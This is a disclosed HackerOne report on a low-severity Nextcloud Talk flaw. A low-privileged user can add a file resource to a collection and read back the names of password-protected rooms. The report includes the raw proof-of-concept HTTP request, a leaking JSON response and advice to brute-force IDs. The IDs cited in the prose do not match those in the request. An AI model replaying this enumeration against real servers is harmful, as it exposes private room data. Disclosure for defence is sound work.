# Talk - Leak of password-protected room name via already existent resource addition

## Report Details
- **Report ID**: 662218
- **URL**: https://hackerone.com/reports/662218
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-28T11:34:30.410Z
- **Disclosed**: 2020-03-01T13:18:20.583Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
CVSS
----

Medium 4.3 [CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

Description
-----------

Affected: Talk / Spreed 6.0.3

The name of shared but password-protected rooms leaks to low-privileged authenticated users. 

An attacker does not need to guess room IDs, but can simply iterate over IDs to gather all names of all affected rooms.

POC
---

Setup:

- Add a password-protected room: Talk -> New conversation -> enter a name -> Share link -> set password
- Add a project: Projects -> Add a project -> select a file

Attack with a low-privileged user: 

- Build the following request (eg by going to Projects -> Add project -> select a file in a project the user has access to):

        POST /nextcloud/nextcloud/ocs/v2.php/collaboration/resources/collections/21?format=json HTTP/1.1
        Host: 192.168.0.104
        User-Agent: [...]
        Accept: application/json, text/plain, */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/json;charset=utf-8
        requesttoken: [...]
        Content-Length: 43
        Connection: close
        Cookie: [...]

        {"resourceType":"file","resourceId":"1619"}

`16` is the ID of the password-protected room that the user does not have access to. `1626` is the ID of a file that was shared under the "projects" tab in that room. It is required that the file is already shared, but IDs are iterative and can easily be bruteforced.

The response will contain the room name & ID and the name of the shared file:

    HTTP/1.1 200 OK
    [...]

    {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":{"id":21,"name":"privateprivateprivate","resources":[{"type":"file","id":"1619","name":"aaaa.txt","path":"files\/aaaa.txt","link":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/index.php\/f\/1619","mimetype":"text\/plain","preview-available":true},{"type":"room","id":"w3die6ou","name":"privateprivateprivate","call-type":"public","iconUrl":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/apps\/spreed\/img\/app-dark.svg","link":"http:\/\/192.168.0.104\/nextcloud\/nextcloud\/index.php\/call\/w3die6ou"}]}}}

## Impact

leak of all password-protected room names to low-privileged attacker

## Attachments
No attachments
